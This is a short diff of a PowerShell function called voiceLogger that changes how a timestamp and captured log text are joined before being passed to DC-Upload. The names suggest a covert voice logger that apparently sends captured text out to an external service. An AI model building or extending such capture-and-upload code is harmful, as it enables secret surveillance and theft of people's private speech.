@@ -41,7 +41,7 @@ function voiceLogger {
             $text = get-content $log -raw
      	    $tstamp = Get-TimeStamp
 	    $str1 = ‘(-) ’
-	    $conc = [System.String]::Concat($str1,"  ",$tstamp,"  ",$text)
+	    $conc = [System.String]::Concat($str1," : ",$tstamp," : ",$text)
             DC-Upload $conc 
 
             # Use a switch statement with the $results variable
